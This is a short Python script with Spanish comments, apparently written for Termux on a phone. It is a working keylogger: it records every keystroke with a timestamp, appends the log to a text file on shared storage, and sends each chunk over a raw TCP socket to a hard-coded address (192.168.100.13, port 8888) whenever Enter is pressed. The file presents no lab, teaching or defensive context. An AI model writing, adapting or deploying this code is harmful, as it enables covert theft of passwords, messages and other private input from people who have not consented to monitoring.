from pynput import keyboard
from datetime import datetime
import socket

# Dirección IP y puerto del otro dispositivo (como otro celular o computadora)
IP_DESTINO = "192.168.100.13"
PUERTO = 8888

# Ruta donde se guardará el archivo .txt en el celular
ruta_archivo = "/data/data/com.termux/files/home/storage/shared/Anime/Textos_teclas.txt"

log = ""

def formatear_tecla(key):
    try:
        return key.char
    except AttributeError:
        key_map = {
            keyboard.Key.space: "[ESPACIO]",
            keyboard.Key.enter: "[ENTER]",
            keyboard.Key.tab: "[TAB]",
            keyboard.Key.backspace: "[BORRAR]",
            keyboard.Key.shift: "[SHIFT]",
            keyboard.Key.shift_r: "[SHIFT DERECHA]",
            keyboard.Key.ctrl_l: "[CTRL]",
            keyboard.Key.ctrl_r: "[CTRL DERECHA]",
            keyboard.Key.alt: "[ALT]",
            keyboard.Key.alt_gr: "[ALT GR]",
            keyboard.Key.esc: "[ESC]",
            keyboard.Key.caps_lock: "[MAYÚS]",
            keyboard.Key.cmd: "[CMD]",
        }
        return key_map.get(key, f"[{key}]")

def guardar_en_archivo(mensaje):
    try:
        with open(ruta_archivo, "a", encoding="utf-8") as f:
            f.write(mensaje)
    except Exception as e:
        print("Error al guardar el archivo:", e)

def enviar_por_red(mensaje):
    try:
        cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        cliente.connect((IP_DESTINO, PUERTO))
        cliente.sendall(mensaje.encode("utf-8"))
        cliente.close()
    except Exception as e:
        print("Error al enviar por red:", e)

def on_press(key):
    global log
    tecla_formateada = formatear_tecla(key)
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log += f"{timestamp} - {tecla_formateada}\n"

    if key == keyboard.Key.enter:
        if log.strip():
            guardar_en_archivo(log)
            enviar_por_red(log)
        log = ""

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
